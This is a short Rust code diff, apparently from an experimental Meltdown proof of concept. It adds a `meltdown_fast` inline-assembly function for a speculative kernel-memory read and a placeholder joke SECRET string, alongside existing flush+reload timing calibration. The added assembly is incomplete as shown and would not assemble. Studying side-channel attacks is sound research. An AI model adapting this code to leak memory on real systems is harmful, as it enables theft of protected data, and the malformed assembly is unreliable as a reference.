@@ -8,6 +8,16 @@ use terminal::{print, println};
 
 use core::arch::asm;
 
+pub fn meltdown_fast(pointer: *const u128) {
+    unsafe {
+        asm!(
+            "mov {tmp} [{x}]",
+            "shl 12, {tmp}",
+            "mov {tmp2} [{base}+{tmp}]",
+        );
+    }
+}
+
 pub fn rdtsc() -> u64 {
     let high: u32;
     let low: u32;
@@ -93,6 +103,7 @@ pub fn detect_flush_reload_threshold() -> u64{
 pub fn main() {
     println!("Meltdown start\n");
     const ARRAY_SIZE: usize = 256 * 256; // 256 entries, each containing 256 u128's, meaning 256*4K
+    const SECRET: &str = "Whoever reads this is dumb.";
     
     println!("Current CPU time: {}", rdtsc());
     let cache_miss_threshold = detect_flush_reload_threshold();
